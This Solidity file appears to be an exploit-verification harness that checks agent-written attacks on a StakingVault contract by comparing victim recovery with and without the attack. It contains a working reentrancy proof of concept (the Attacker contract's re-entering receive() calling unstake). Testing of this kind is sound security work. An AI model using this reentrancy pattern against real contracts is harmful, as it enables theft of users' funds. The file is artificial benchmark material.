// SPDX-License-Identifier: Apache-2.0
pragma solidity >=0.8.0;

import "arbiter-target/StakingVault.sol";
import "./Vm.sol";

interface _ArbiterToken { function balanceOf(address) external view returns (uint256); }

/// How an attacker finds out who the victim is. A real attacker can read the chain, so
/// withholding the victim's address would make whole classes of attack inexpressible --
/// but that address is drawn per run precisely so SETUP cannot name it. Both hold at once
/// if the address is discoverable at RUN time and unknowable at WRITE time: your Attacker
/// asks its own deployer for it.
interface _ArbiterHarness { function arbiterVictim() external view returns (address); }

error ArbiterNoHarm(uint256 recoveredWithoutAttack, uint256 recoveredWithAttack,
                    uint256 attackerGain);

contract Attacker {
    StakingVault p;
    bool reentered;
    constructor(address _p) {
        p = StakingVault(_p);
    }
    function attack() external {
        // stake 1 ether
        p.stake{value: 1 ether}();
        // trigger reentrancy
        p.unstake();
    }
    receive() external payable {
        if (!reentered) {
            reentered = true;
            p.unstake();
        }
    }
}

contract TestArbiterVictim is Harness {
    function arbiterVictim() external pure returns (address) { return arbVictim; }

    bytes32 internal constant ARB_COMPLETED = keccak256("arbiter.predicate.reached");
    address internal constant arbVictim = address(uint160(0x008d22444039c4c0817194bd3efc01d0d8c0b9e22d));

    StakingVault internal target;
    Attacker internal atk;
    // The attacker's two identities, at contract level so they outlive arbDeploy.
    // Both are measured, because profit parked in the EOA rather than in the contract
    // is still profit and used to read as zero.
    address internal constant arbAtkEoa =
        address(uint160(uint256(keccak256("arbiter.attacker"))));
    address internal constant arbEoa = address(uint160(0x00f4f6ad53198b63fdc1b0af4eeba635977e7864b3));

    function testArbiterVictimLoss() public {
        require(
            this.arbiterRun() == ARB_COMPLETED,
            "ARBITER: execution halted before the harness predicate ran"
        );
    }

    // ---- agent-supplied fragments, each in its own frame ----

    function arbSetup() external {
        target = new StakingVault{value: 5 ether}();
    }

    function arbEnter() external {
        vm.startPrank(arbVictim, arbVictim);
        target.stake{value: 2 ether}();
        vm.stopPrank();
    }

    function arbExit() external {
        vm.startPrank(arbVictim, arbVictim);
        target.unstake();
        vm.stopPrank();
    }

    /// The attacker is built ONCE per trial, not once per round.
    ///
    /// It used to live at the top of arbAttack, which the round loop calls `rounds`
    /// times -- so at rounds=8 the attacker was redeployed and re-funded eight times
    /// and nothing it accumulated survived into the next round. Two consequences, and
    /// the second is the serious one. Per-round rounding bias, which is the only reason
    /// the eight-round environment exists, was structurally unprovable. And each
    /// round's contribution was floored at zero before being summed, so an attack that
    /// gained one ether and lost one ether each round reported four ether of profit
    /// against a true net of zero -- while `gain` is the left-hand side of the
    /// conservation check that makes victim_loss mean *the attacker is holding what the
    /// victim lost*. That is a constructible false positive, not a missed finding.
    function arbDeploy() external {
        atk = new Attacker(address(target));
        vm.deal(address(atk), 10000000000000000000);
        vm.deal(arbAtkEoa, 10000000000000000000);
    }

    function arbAttack() external {
        atk.attack();
    }

    /// One world. `withAttack` is the only thing that differs between the two runs of
    /// a pair; the other three arguments are the environment, which is swept.
    function arbTrial(bool withAttack, uint256 endow, uint256 warpBy, uint256 rounds)
        external
        returns (uint256 recovered, uint256 gain, bool attackRan)
    {
        this.arbSetup();
        if (warpBy > 0) { vm.warp(block.timestamp + warpBy); vm.roll(block.number + 1); }
        vm.deal(arbVictim, endow);
        this.arbEnter();
        uint256 mid = arbVictim.balance;

        attackRan = true;
        if (withAttack) {
            // A fresh attacker per round, and a SIGNED delta per round.
            //
            // Both halves are load-bearing and they were confused with each other. The
            // fresh identity is not a bug: an attacker really can deploy a second
            // contract, and against a contract that keys state by address -- a queue
            // nonce, a claim marker -- repeating from a new address is the attack.
            // Removing it was measured to cost a real finding: the reentrancy the
            // gateway had just proven stopped reproducing, because rounds two onward
            // reverted on the first attacker's own spent nonce.
            //
            // The bug was the flooring. Each round's contribution used to be clamped at
            // zero before being summed, so an attacker that took one ether and gave one
            // back reported four ether of profit over eight rounds against a true net of
            // nothing -- and `gain` is the left-hand side of the conservation check. A
            // signed sum keeps repetition and prices it honestly: a round that loses
            // money now subtracts.
            int256 net;
            for (uint256 r = 0; r < rounds; r++) {
                this.arbDeploy();
                // After the funding, so a handout can never be counted as profit.
                int256 pre = int256(address(atk).balance + arbAtkEoa.balance);
                (bool ok, ) =
                    address(this).call(abi.encodeWithSignature("arbAttack()"));
                if (r == 0) { attackRan = ok; }
                if (!ok) { break; }
                net += int256(address(atk).balance + arbAtkEoa.balance) - pre;
            }
            gain = net > 0 ? uint256(net) : 0;
        }

        // A victim who cannot get out AT ALL has recovered nothing. That is the harm,
        // not an error, so the revert is caught rather than propagated.
        (bool exited, ) = address(this).call(abi.encodeWithSignature("arbExit()"));
        recovered = exited && arbVictim.balance > mid ? arbVictim.balance - mid : 0;
    }

    /// The endowment, the clock and the number of rounds were never the agent's to
    /// choose -- they are the harness's constants -- so an attack that is right in
    /// mechanism and short of scale is being failed for the harness's decision. Each
    /// environment is tried as a matched PAIR, so the comparison inside a pair is always
    /// like for like and a sweep can only ever surface an asymmetry, never invent one.
    function arbiterRun() external returns (bytes32) {
        uint256[4] memory endow = [uint256(10000000000000000000), 10000000000000000000000, 10000000000000000000, 10000000000000000000];
        uint256[4] memory warps = [uint256(0), 0, 604800, 0];
        uint256[4] memory rounds = [uint256(1), 1, 1, 8];

        uint256 bestA;
        uint256 bestB;
        uint256 bestGain;
        bool anyRan;

        for (uint256 i = 0; i < 4; i++) {
            (bool okA, bytes memory ra) = address(this).call(
                abi.encodeWithSignature(
                    "arbTrial(bool,uint256,uint256,uint256)",
                    false, endow[i], warps[i], rounds[i]));
            if (!okA) { continue; }
            (uint256 recA, , ) = abi.decode(ra, (uint256, uint256, bool));
            if (recA == 0) { continue; }   // no baseline, so no harm can be shown

            (bool okB, bytes memory rb) = address(this).call(
                abi.encodeWithSignature(
                    "arbTrial(bool,uint256,uint256,uint256)",
                    true, endow[i], warps[i], rounds[i]));
            if (!okB) { continue; }
            (uint256 recB, uint256 g, bool ran) = abi.decode(rb, (uint256, uint256, bool));
            if (!ran) { continue; }
            anyRan = true;

            // Not `shortfall`. The report block below declares one at function scope, so
            // this used to shadow it and solc said so on EVERY compile of a victim_loss
            // exploit -- a nine-line warning quoting two template lines the agent did not
            // write and cannot change, spent out of the six thousand characters it gets.
            uint256 gap = recA > recB ? recA - recB : 0;
            if (gap > 0 && g >= gap) {
                bestA = recA; bestB = recB; bestGain = g;
                break;                        // one environment is enough
            }
            if (bestA == 0) { bestA = recA; bestB = recB; bestGain = g; }
        }

        require(anyRan, "ARBITER: the attack reverted in every environment, or the "
                        "victim's own path never worked -- fix victim_enter/victim_exit");

        uint256 recoveredA = bestA;
        uint256 recoveredB = bestB;
        uint256 attackGain = bestGain;

        // The definition of the vulnerability, and the one thing the agent cannot
        // arrange for itself: the victim got less back BECAUSE the attack happened, and
        // the attacker is holding more than they started with.
        uint256 shortfall = recoveredA > recoveredB ? recoveredA - recoveredB : 0;
        if (recoveredB >= recoveredA || attackGain == 0 || attackGain < shortfall) {
            revert ArbiterNoHarm(recoveredA, recoveredB, attackGain);
        }
        return ARB_COMPLETED;
    }
}
